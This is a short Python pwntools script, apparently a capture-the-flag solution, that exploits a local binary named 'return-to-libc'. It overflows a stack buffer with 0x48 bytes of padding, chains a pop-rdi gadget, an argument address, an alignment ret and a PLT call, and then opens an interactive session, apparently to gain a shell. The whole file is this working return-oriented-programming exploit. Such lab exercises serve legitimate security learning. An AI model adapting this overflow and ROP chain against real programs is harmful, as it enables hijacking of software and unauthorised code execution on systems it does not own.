from pwn import *

p = process('./return-to-libc')

p.recvuntil(b': ')

pop_rdi = 0x40119e

pay = b'a' * 0x48
pay += p64(pop_rdi) + p64(0x404048) + p64(0x40101a) + p64(0x401070)

p.send(pay)

p.interactive()